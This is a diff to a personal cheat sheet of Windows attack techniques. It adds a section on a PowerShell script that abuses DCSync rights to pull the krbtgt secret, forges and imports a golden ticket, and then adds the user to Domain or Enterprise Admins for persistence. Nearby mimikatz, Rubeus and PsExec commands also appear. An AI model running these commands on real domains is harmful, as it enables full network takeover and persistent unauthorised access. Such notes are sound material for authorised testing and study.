@@ -119,6 +119,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-decrypt-efs-files-with-mimikatz-if-adminsystem">Decrypt EFS Files with Mimikatz if Admin/System</a>
       * <a href="#-uac-bypass">UAC Bypass</a>
       * <a href="#-golden-ticket-attack">Golden Ticket Attack</a>
+      * <a href="#-golden-ticket-attack">DCSync & Golden Ticket in One</a>
       * <a href="#-child-domain-to-forest-compromise">Child Domain to Forest Compromise</a>
       * <a href="#-dump-ntdsdit">Dump NTDS.dit</a>
       * <a href="#-sebackupprivlege---dump-ntdsdit">SeBackupPrivlege - Dump NTDS.dit</a>
@@ -1873,6 +1874,21 @@ mimikatz # kerberos::ptt <ticket_kirbi_file>
 .\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
 
 .\PsExec.exe -accepteula \\<remote_hostname> cmd
+```
+
+
+
+#### [](#header-4) DCSync & Golden Ticket in One
+
+```powershell
+#https://raw.githubusercontent.com/vletoux/MakeMeEnterpriseAdmin/master/MakeMeEnterpriseAdmin.ps1
+
+
+This script will abuse DCSync privileges to extract the krbtgt password and automatically generate a golden ticket before finally importing it into the current session.
+
+You can then add yourself into the Domain Admins / Enterprise Admins group to gain persistance.
+
+.\MakeMeEnterpriseAdmin.ps1
 ```
 
 
